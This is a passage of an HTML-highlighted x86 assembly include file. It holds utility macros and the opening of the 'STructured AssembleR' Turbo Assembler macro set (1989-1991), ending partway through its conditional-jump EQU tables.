</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">STO_TWO_BYTE</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">value1</span><span class="sc4">:</span><span class="sc10">REQ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">value2</span><span class="sc4">:</span><span class="sc10">REQ</span><span class="sc0">
</span><span class="sc1">;                STO_WORD  (value2 shl 8) or value1</span><span class="sc0">
                </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">value2</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">value1</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">value2</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">value1</span><span class="sc0">
                </span><span class="sc9">ELSE</span><span class="sc0">
                    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">MOVSEG</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">to_seg</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">from_seg</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">from_seg</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc5">to_seg</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">MASKA</span><span class="sc0">       </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">regis1</span><span class="sc4">:</span><span class="sc10">REQ</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">mask2</span><span class="sc4">:</span><span class="sc10">REQ</span><span class="sc0"> </span><span class="sc1">;MASKA al, 001xx110</span><span class="sc0">
                        </span><span class="sc1">;and   al, 00?11??0</span><span class="sc0">
                        </span><span class="sc1">;or    al, 00100110</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">tmp_mask</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc4">=</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">tmp_mask</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">IRPC</span><span class="sc0">  </span><span class="sc5">sb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mask2</span><span class="sc0">
            </span><span class="sc5">tmp_mask</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">tmp_mask</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">sb</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">regis1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmp_mask</span><span class="sc0">

        </span><span class="sc5">x</span><span class="sc4">=</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">tmp_mask</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">IRPC</span><span class="sc0">  </span><span class="sc5">sb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mask2</span><span class="sc0">
            </span><span class="sc5">tmp_mask</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">tmp_mask</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">sb</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">tmp_mask</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc5">regis1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmp_mask</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">MIN</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">nomov</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">nomov</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
</span><span class="sc5">nomov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">MAX</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">nomov</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nomov</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">frst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scnd</span><span class="sc0">
</span><span class="sc5">nomov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">crproc</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">procname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">proc_crc</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">procname</span><span class="sc0">
</span><span class="sc5">procname</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">cryproc</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cryproc</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">proc_crc</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pbproc</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">procname</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">procname</span><span class="sc0">
</span><span class="sc5">procname</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">lblname</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">lblname</span><span class="sc0">
</span><span class="sc5">lblname</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;º The STructured AssembleR language macros º</span><span class="sc0">
</span><span class="sc1">;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;      (C) Dmitry Timchenko 1989-1991</span><span class="sc0">

</span><span class="sc1">;       Version 1.4</span><span class="sc0">
</span><span class="sc1">; Turbo Assembler Version. LONG specifier is UNNECESSARY</span><span class="sc0">


    </span><span class="sc9">ifndef</span><span class="sc0">  </span><span class="sc5">??version</span><span class="sc0">
</span><span class="sc9">.err</span><span class="sc0">    </span><span class="sc4">****</span><span class="sc0"> </span><span class="sc5">Turbo</span><span class="sc0"> </span><span class="sc5">Assembler</span><span class="sc0"> </span><span class="sc5">required.</span><span class="sc0"> </span><span class="sc9">For</span><span class="sc0"> </span><span class="sc5">MASM</span><span class="sc0"> </span><span class="sc5">use</span><span class="sc0"> </span><span class="sc5">STAR13.INC</span><span class="sc0"> </span><span class="sc4">****</span><span class="sc0">
    </span><span class="sc9">endif</span><span class="sc0">

    </span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">??version</span><span class="sc0"> </span><span class="sc9">lt</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc9">.err</span><span class="sc0">    </span><span class="sc4">****</span><span class="sc0"> </span><span class="sc5">Turbo</span><span class="sc0"> </span><span class="sc5">Assembler</span><span class="sc0"> </span><span class="sc2">2.0</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">higher</span><span class="sc0"> </span><span class="sc5">required.</span><span class="sc0"> </span><span class="sc5">Use</span><span class="sc0"> </span><span class="sc5">STAR13T.INC</span><span class="sc0"> </span><span class="sc4">****</span><span class="sc0">
    </span><span class="sc9">endif</span><span class="sc0">


    </span><span class="sc5">JUMPS</span><span class="sc0">       </span><span class="sc1">;It makes all dirty work of SHORT/LONG</span><span class="sc0">
            </span><span class="sc1">; recognizing ( see STAR13.INC )</span><span class="sc0">


</span><span class="sc1">;ÚÄÄÄÄÄ Auxiliary (implementation) macros ÄÄÄÄÄ¿</span><span class="sc0">

</span><span class="sc1">;  Current level counters settings</span><span class="sc0">

</span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PN</span><span class="sc4">,</span><span class="sc5">PL</span><span class="sc4">,</span><span class="sc5">PV</span><span class="sc0">
</span><span class="sc5">PN</span><span class="sc4">&amp;</span><span class="sc5">@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">PN</span><span class="sc4">&amp;</span><span class="sc5">@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc4">&amp;</span><span class="sc5">PV</span><span class="sc0">
</span><span class="sc5">T@</span><span class="sc4">&amp;</span><span class="sc5">PN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">PN</span><span class="sc4">&amp;</span><span class="sc5">@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PL</span><span class="sc0">
</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">B@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">
</span><span class="sc5">T@E</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">E@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">
</span><span class="sc5">T@X</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">X@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;  Label (MARK) settings</span><span class="sc0">

</span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PM</span><span class="sc4">,</span><span class="sc5">PL</span><span class="sc4">,</span><span class="sc5">PN</span><span class="sc0">
</span><span class="sc5">PM</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc4">&amp;</span><span class="sc5">PN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;  Forward jump vector generation</span><span class="sc0">
</span><span class="sc1">;   PC  conditon code ( Z/NZ/C/NC... )</span><span class="sc0">
</span><span class="sc1">;   PM  label header</span><span class="sc0">
</span><span class="sc1">;   PL  nesting level</span><span class="sc0">
</span><span class="sc1">;   PN  counter for this level</span><span class="sc0">
</span><span class="sc1">;   INV 0/1 - inverse condition</span><span class="sc0">

</span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PC</span><span class="sc4">,</span><span class="sc5">PM</span><span class="sc4">,</span><span class="sc5">PL</span><span class="sc4">,</span><span class="sc5">PN</span><span class="sc4">,</span><span class="sc5">INV</span><span class="sc0">

</span><span class="sc5">V@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">PM</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc4">&amp;</span><span class="sc5">PN</span><span class="sc0">    </span><span class="sc1">;Label to jump to</span><span class="sc0">

    </span><span class="sc9">IFB</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PC</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;Command: "JMP"</span><span class="sc0">

    </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">INV</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;INV=0 --&gt; Need command</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">V@</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">           </span><span class="sc1">;else  --&gt; Needn't command</span><span class="sc0">

    </span><span class="sc9">ELSE</span><span class="sc0">            </span><span class="sc1">;Command: "J&lt;PC&gt;"</span><span class="sc0">

    </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">INV</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;YesJump - straight condition</span><span class="sc0">
    </span><span class="sc5">_YJ</span><span class="sc4">&amp;</span><span class="sc5">PC</span><span class="sc0">  </span><span class="sc5">V@</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc5">_NJ</span><span class="sc4">&amp;</span><span class="sc5">PC</span><span class="sc0">  </span><span class="sc5">V@</span><span class="sc0">      </span><span class="sc1">;NoJmp - reverse condition</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

    </span><span class="sc9">ENDIF</span><span class="sc0">           </span><span class="sc1">;(Command)</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;  Reverse jump vector generation</span><span class="sc0">
</span><span class="sc5">J@R</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PC</span><span class="sc4">,</span><span class="sc5">PM</span><span class="sc4">,</span><span class="sc5">PL</span><span class="sc4">,</span><span class="sc5">PN</span><span class="sc0">
</span><span class="sc5">V@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">PM</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc4">&amp;</span><span class="sc5">PN</span><span class="sc0">

    </span><span class="sc9">IFB</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PC</span><span class="sc4">&gt;</span><span class="sc1">;;      Command: JMP</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">V@</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc1">;;          Command: J&lt;PC&gt;</span><span class="sc0">
    </span><span class="sc5">_YJ</span><span class="sc4">&amp;</span><span class="sc5">PC</span><span class="sc0">  </span><span class="sc5">V@</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc1">;;         (Command)</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;  ELSE mode settings</span><span class="sc0">
</span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PL</span><span class="sc4">,</span><span class="sc5">VAL</span><span class="sc0">
    </span><span class="sc9">IFNB</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">VAL</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">L@I</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">VAL</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">TL@</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">L@I</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  An auxiliary macro</span><span class="sc0">
</span><span class="sc1">;  for counters initialization</span><span class="sc0">
</span><span class="sc5">I@NIT</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">PL</span><span class="sc0">
</span><span class="sc5">B@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">E@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">X@</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">L@I</span><span class="sc4">&amp;</span><span class="sc5">PL</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;   Variables initial settings macro.</span><span class="sc0">

</span><span class="sc5">INITS</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc1">;;**********</span><span class="sc0">

</span><span class="sc5">L@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">REPT</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">L@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">L@</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">I@NIT</span><span class="sc0">   </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_YJO</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JO</span><span class="sc0">
</span><span class="sc5">_YJNO</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNO</span><span class="sc0">
</span><span class="sc5">_YJB</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">
 </span><span class="sc5">_YJNAE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJB</span><span class="sc0">
 </span><span class="sc5">_YJC</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJB</span><span class="sc0">
</span><span class="sc5">_YJAE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JAE</span><span class="sc0">
 </span><span class="sc5">_YJNB</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJAE</span><span class="sc0">
 </span><span class="sc5">_YJNC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJAE</span><span class="sc0">
</span><span class="sc5">_YJE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JE</span><span class="sc0">
 </span><span class="sc5">_YJZ</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJE</span><span class="sc0">
</span><span class="sc5">_YJNE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNE</span><span class="sc0">
 </span><span class="sc5">_YJNZ</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJNE</span><span class="sc0">
</span><span class="sc5">_YJBE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JBE</span><span class="sc0">
 </span><span class="sc5">_YJNA</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJBE</span><span class="sc0">
</span><span class="sc5">_YJA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JA</span><span class="sc0">
 </span><span class="sc5">_YJNBE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJA</span><span class="sc0">
</span><span class="sc5">_YJS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JS</span><span class="sc0">
</span><span class="sc5">_YJNS</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNS</span><span class="sc0">
</span><span class="sc5">_YJP</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JP</span><span class="sc0">
 </span><span class="sc5">_YJPE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJP</span><span class="sc0">
</span><span class="sc5">_YJNP</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNP</span><span class="sc0">
 </span><span class="sc5">_YJPO</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJNP</span><span class="sc0">
</span><span class="sc5">_YJL</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JL</span><span class="sc0">
 </span><span class="sc5">_YJNGE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJL</span><span class="sc0">
</span><span class="sc5">_YJGE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JGE</span><span class="sc0">
 </span><span class="sc5">_YJNL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJGE</span><span class="sc0">
</span><span class="sc5">_YJLE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JLE</span><span class="sc0">
 </span><span class="sc5">_YJNG</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJLE</span><span class="sc0">
</span><span class="sc5">_YJG</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JG</span><span class="sc0">
 </span><span class="sc5">_YJNLE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJG</span><span class="sc0">

</span><span class="sc5">_YJCXZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JCXZ</span><span class="sc0">
</span><span class="sc5">_YJLU</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">LOOP</span><span class="sc0">
</span><span class="sc5">_YJLUNE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">LOOPNE</span><span class="sc0">
 </span><span class="sc5">_YJLUNZ</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJLUNE</span><span class="sc0">
</span><span class="sc5">_YJLUE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">LOOPE</span><span class="sc0">
 </span><span class="sc5">_YJLUZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_YJLUNE</span><span class="sc0">

</span><span class="sc5">_NJO</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNO</span><span class="sc0">
</span><span class="sc5">_NJNO</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JO</span><span class="sc0">
</span><span class="sc5">_NJB</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNB</span><span class="sc0">
 </span><span class="sc5">_NJNAE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJB</span><span class="sc0">
 </span><span class="sc5">_NJC</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJB</span><span class="sc0">
</span><span class="sc5">_NJAE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNAE</span><span class="sc0">
 </span><span class="sc5">_NJNB</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJAE</span><span class="sc0">
 </span><span class="sc5">_NJNC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJAE</span><span class="sc0">
</span><span class="sc5">_NJE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNE</span><span class="sc0">
 </span><span class="sc5">_NJZ</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJE</span><span class="sc0">
</span><span class="sc5">_NJNE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JE</span><span class="sc0">
 </span><span class="sc5">_NJNZ</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJNE</span><span class="sc0">
